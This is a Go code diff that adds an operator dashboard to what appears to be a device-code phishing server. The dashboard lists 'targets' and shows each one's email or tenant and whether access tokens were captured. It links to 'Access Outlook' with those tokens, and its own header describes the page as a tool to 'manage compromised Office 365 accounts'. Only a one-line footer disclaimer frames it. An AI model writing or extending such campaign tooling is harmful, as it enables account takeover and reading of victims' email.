@@ -50,6 +50,7 @@ func NewHttpServer() (*HttpServer, error) {
 	// Admin panel
 	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
 	// Device code landing pages + token dashboard
+	r.HandleFunc("/dc/dashboard", s.handleDCDashboard).Methods("GET")
 	r.HandleFunc("/dc/use/{token}", s.handleDCUse).Methods("GET")
 	r.HandleFunc("/dc/inbox/{token}", s.handleDCInbox).Methods("GET")
 	r.HandleFunc("/dc/open/{token}", s.handleDCOpen).Methods("GET")
@@ -301,6 +302,238 @@ func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.Write([]byte(DCLandingPage(tgt)))
+}
+
+// handleDCDashboard renders the master dashboard listing all DC targets with Outlook access
+func (s *HttpServer) handleDCDashboard(w http.ResponseWriter, r *http.Request) {
+	targets := GetDCTargets()
+
+	var rows strings.Builder
+	for _, t := range targets {
+		t.mu.Lock()
+		email := t.Email
+		if email == "" {
+			email = t.Tenant
+		}
+		status := t.Status
+		hasTokens := t.AccessToken != ""
+		startedAt := t.StartedAt.Format("2006-01-02 15:04")
+		landingToken := t.LandingToken
+		t.mu.Unlock()
+
+		// Status badge
+		statusColor := "#6c757d"
+		if status == "completed" && hasTokens {
+			statusColor = "#28a745"
+		} else if status == "pending" {
+			statusColor = "#ffc107"
+		} else if status == "expired" || status == "declined" {
+			statusColor = "#dc3545"
+		}
+
+		// Action buttons
+		accessBtn := ""
+		if hasTokens {
+			accessBtn = fmt.Sprintf(`<a href="/dc/open/%s" class="btn-small" style="background:#155724;color:#fff;padding:6px 12px;border-radius:3px;text-decoration:none;font-size:12px;font-weight:bold;display:inline-block;margin-right:5px;" target="_blank">🔓 Access Outlook</a>`,
+				template.HTMLEscapeString(landingToken))
+		}
+
+		moreBtn := fmt.Sprintf(`<a href="/dc/use/%s" class="btn-small" style="background:#0078d4;color:#fff;padding:6px 12px;border-radius:3px;text-decoration:none;font-size:12px;font-weight:bold;display:inline-block;margin-right:5px;">📊 Details</a>`,
+			template.HTMLEscapeString(landingToken))
+
+		rows.WriteString(fmt.Sprintf(`<tr>
+			<td>%s</td>
+			<td><span style="background:%s;color:white;padding:4px 8px;border-radius:3px;font-size:11px;font-weight:bold;">%s</span></td>
+			<td>%s</td>
+			<td style="font-size:11px;color:#666;">%s</td>
+			<td>%s%s</td>
+		</tr>`,
+			template.HTMLEscapeString(email),
+			statusColor,
+			template.HTMLEscapeString(status),
+			template.HTMLEscapeString(startedAt),
+			map[bool]string{true: "✅ Yes", false: "❌ No"}[hasTokens],
+			accessBtn,
+			moreBtn,
+		))
+	}
+
+	if rows.Len() == 0 {
+		rows.WriteString(`<tr><td colspan="5" style="text-align:center;color:#999;padding:30px;">No targets yet. Start a Device Code campaign to see results here.</td></tr>`)
+	}
+
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, `<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Device Code Dashboard — Outlook Access</title>
+	<style>
+		* { margin: 0; padding: 0; box-sizing: border-box; }
+		body {
+			font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+			min-height: 100vh;
+			padding: 40px 20px;
+		}
+		.container {
+			max-width: 1200px;
+			margin: 0 auto;
+			background: white;
+			border-radius: 12px;
+			box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+			overflow: hidden;
+		}
+		.header {
+			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+			color: white;
+			padding: 40px;
+			text-align: center;
+		}
+		.header h1 {
+			font-size: 28px;
+			margin-bottom: 10px;
+			font-weight: 700;
+		}
+		.header p {
+			font-size: 14px;
+			opacity: 0.9;
+		}
+		.content {
+			padding: 40px;
+		}
+		.stats {
+			display: grid;
+			grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+			gap: 20px;
+			margin-bottom: 30px;
+		}
+		.stat-card {
+			background: #f8f9fa;
+			padding: 20px;
+			border-radius: 8px;
+			text-align: center;
+			border-left: 4px solid #667eea;
+		}
+		.stat-card .value {
+			font-size: 32px;
+			font-weight: 700;
+			color: #667eea;
+		}
+		.stat-card .label {
+			font-size: 12px;
+			color: #666;
+			margin-top: 8px;
+			text-transform: uppercase;
+		}
+		table {
+			width: 100%;
+			border-collapse: collapse;
+		}
+		th {
+			background: #f8f9fa;
+			padding: 15px;
+			text-align: left;
+			font-weight: 600;
+			font-size: 12px;
+			text-transform: uppercase;
+			color: #666;
+			border-bottom: 2px solid #e9ecef;
+		}
+		td {
+			padding: 15px;
+			border-bottom: 1px solid #e9ecef;
+		}
+		tr:hover {
+			background: #f8f9fa;
+		}
+		.btn-small {
+			display: inline-block;
+			padding: 6px 12px;
+			border-radius: 3px;
+			text-decoration: none;
+			font-size: 12px;
+			font-weight: bold;
+			transition: all 0.2s;
+			margin-right: 5px;
+		}
+		.btn-small:hover {
+			transform: translateY(-2px);
+			box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+		}
+		.footer {
+			background: #f8f9fa;
+			padding: 20px 40px;
+			text-align: center;
+			color: #666;
+			font-size: 12px;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<div class="header">
+			<h1>🔐 Device Code Dashboard</h1>
+			<p>Manage compromised Office 365 accounts & access Outlook</p>
+		</div>
+		<div class="content">
+			<div class="stats">
+				<div class="stat-card">
+					<div class="value">%d</div>
+					<div class="label">Total Targets</div>
+				</div>
+				<div class="stat-card">
+					<div class="value">%d</div>
+					<div class="label">Completed (Tokens Available)</div>
+				</div>
+				<div class="stat-card">
+					<div class="value">%d</div>
+					<div class="label">Pending</div>
+				</div>
+			</div>
+
+			<h2 style="margin-bottom:20px;font-size:16px;color:#333;">All Targets</h2>
+			<table>
+				<thead>
+					<tr>
+						<th>Email / Tenant</th>
+						<th>Status</th>
+						<th>Started</th>
+						<th>Tokens</th>
+						<th>Actions</th>
+					</tr>
+				</thead>
+				<tbody>
+					%s
+				</tbody>
+			</table>
+		</div>
+		<div class="footer">
+			<p>⚠️ Use responsibly. Unauthorized access to accounts is illegal.</p>
+		</div>
+	</div>
+</body>
+</html>`,
+		len(targets),
+		countByStatus(targets, "completed"),
+		countByStatus(targets, "pending"),
+		rows.String(),
+	)
+}
+
+// countByStatus counts targets by status
+func countByStatus(targets []*DCTarget, status string) int {
+	count := 0
+	for _, t := range targets {
+		t.mu.Lock()
+		if t.Status == status && status == "completed" && t.AccessToken != "" {
+			count++
+		} else if t.Status == status && status != "completed" {
+			count++
+		}
+		t.mu.Unlock()
+	}
+	return count
 }
 
 // handleDCUse fetches Graph API data for a completed device code target and
